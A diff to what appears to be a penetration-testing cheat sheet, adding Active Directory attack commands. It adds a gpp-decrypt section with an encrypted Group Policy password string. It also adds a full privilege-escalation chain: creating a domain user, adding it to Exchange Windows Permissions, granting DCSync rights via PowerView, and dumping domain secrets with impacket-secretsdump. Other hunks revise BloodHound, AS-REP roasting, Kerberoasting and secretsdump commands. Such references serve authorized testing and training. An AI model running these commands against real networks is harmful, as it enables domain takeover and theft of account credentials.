@@ -109,6 +109,7 @@ Thank you for reading.
 	- [Password Attacks](#password-attacks-1)
 		- [CrackMapExec](#crackmapexec)
 		- [fcrack](#fcrack)
+  		- [gpp-decrypt](#gpp-decrypt)
 		- [hashcat](#hashcat)
 		- [Hydra](#hydra)
 		- [John](#john)
@@ -120,6 +121,7 @@ Thank you for reading.
 	- [Exploitation Tools](#exploitation-tools-1)
 		- [Metasploit](#metasploit)
 	- [Post Exploitation](#post-exploitation-1)
+ 		- [Abusing Account Operators Group Membership](#abusing-account-operators-group-membership)
  		- [Active Directory Certificate Services (AD CS)](#active-directory-certificate-services-ad-cs)
 		- [ADCSTemplate](#adcstemplate)
   		- [ADMiner](#adminer)
@@ -2349,6 +2351,13 @@ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wor
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
 ```
 
+## gpp-decrypt
+
+```c
+python3 gpp-decrypt.py -f Groups.xml
+python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+```
+
 #### hashcat
 
 > https://hashcat.net/hashcat/
@@ -2755,6 +2764,36 @@ meterpreter > download *
 
 ### Post Exploitation
 
+#### Abusing Account Operators Group Membership
+
+##### Add User
+
+```c
+net user <USERNAME> <PASSWORD> /add /domain
+net group "Exchange Windows Permissions" /add <USERNAME>
+```
+
+##### Import PowerView
+
+```c
+powershell -ep bypass
+. .\PowerView.ps1
+```
+
+##### Add DCSync Rights
+
+```c
+$pass = convertto-securestring '<PASSWORD>' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $pass)
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<DOMAIN>,DC=local" -PrincipalIdentity <USERNAME> -Rights DCSync
+```
+
+##### DCSync
+
+```c
+impacket-secretsdump '<USERNAME>:<PASSWORD>@<RHOST>'
+```
+
 #### Active Directory Certificate Services (AD CS)
 
 ```c
@@ -2925,9 +2964,10 @@ ALTER USER neo4j SET PASSWORD '<PASSWORD>'
 #### BloodHound Python
 
 ```c
-bloodhound-python -d <DOMAIN> -u <USERNAME> -p "<PASSWORD>" -gc <DOMAIN> -c all -ns <RHOST>
-bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -ns <RHOST> -c All
-bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <RHOST> -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
+bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>'-ns <RHOST> -c all --zip
+bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns <RHOST> -c all --zip
+bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
+bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
 ```
 
 #### bloodyAD
@@ -3071,14 +3111,15 @@ impacket-getTGT <RHOST>/<USERNAME> -dc-ip <RHOST> -hashes aad3b435b51404eeaad3b4
 ##### impacket-GetNPUsers
 
 ```c
-impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
-impacket-GetNPUsers <RHOST>/<USERNAME> -request -no-pass -dc-ip <RHOST>
-impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format john -outputfile hashes
+impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+impacket-GetNPUsers <DOMAIN>/<USERNAME> -request -no-pass -dc-ip <RHOST>
+impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format john -outputfile hashes
 ```
 
 ##### impacket-getUserSPNs
 
 ```c
+impacket-GetUserSPNs -request -dc-ip <RHOST> <DOMAIN>/<USERNAME>
 export KRB5CCNAME=<USERNAME>.ccache
 impacket-GetUserSPNs <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<RHOST> -no-pass -request
 ```
@@ -3086,12 +3127,12 @@ impacket-GetUserSPNs <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<RHOST> -no
 ##### impacket-secretsdump
 
 ```c
-export KRB5CCNAME=<USERNAME>.ccache
-impacket-secretsdump <RHOST>/<USERNAME>@<RHOST>
-impacket-secretsdump -k <RHOST>/<USERNAME>@<RHOST>.<RHOST> -no-pass -debug
-impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
-impacket-secretsdump -dc-ip <RHOST> <RHOST>.LOCAL/svc_bes:<PASSWORD>@<RHOST>
+impacket-secretsdump <DOMAIN>/<USERNAME>@<RHOST>
+impacket-secretsdump -dc-ip <RHOST> <DOMAIN>/<SUERNAME>:<PASSWORD>@<RHOST>
 impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
+impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
+export KRB5CCNAME=<USERNAME>.ccache
+impacket-secretsdump -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass -debug
 ```
 
 ##### impacket-psexec
